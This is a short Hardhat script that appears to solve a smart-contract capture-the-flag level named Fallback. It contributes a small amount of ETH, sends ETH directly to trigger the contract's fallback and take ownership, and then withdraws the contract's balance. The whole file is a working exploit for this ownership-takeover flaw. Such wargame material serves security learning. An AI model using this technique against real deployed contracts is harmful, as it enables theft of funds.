import { ethers } from "hardhat";
import { Fallback__factory } from "../typechain/factories/contracts/Fallback__factory";

async function main() {
    const [signer] = await ethers.getSigners();
    const provider = ethers.provider;
    let instance_address =  "0x9Cb14AeF85D0034D70761E97326921e7A02a0f2B";
    let fallback = new Fallback__factory(signer).attach(instance_address);
    console.log(await fallback.owner());
    console.log(await provider.getBalance(instance_address));


    let tx = await fallback.contribute({value:ethers.utils.parseEther("0.0001")});
    await tx.wait();

    tx = await signer.sendTransaction({
        to: instance_address,
        value: ethers.utils.parseEther("0.0001"),
    })
    await tx.wait();
    console.log(await fallback.owner());

    tx = await fallback.withdraw();
    await tx.wait();
    console.log(await provider.getBalance(instance_address));
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
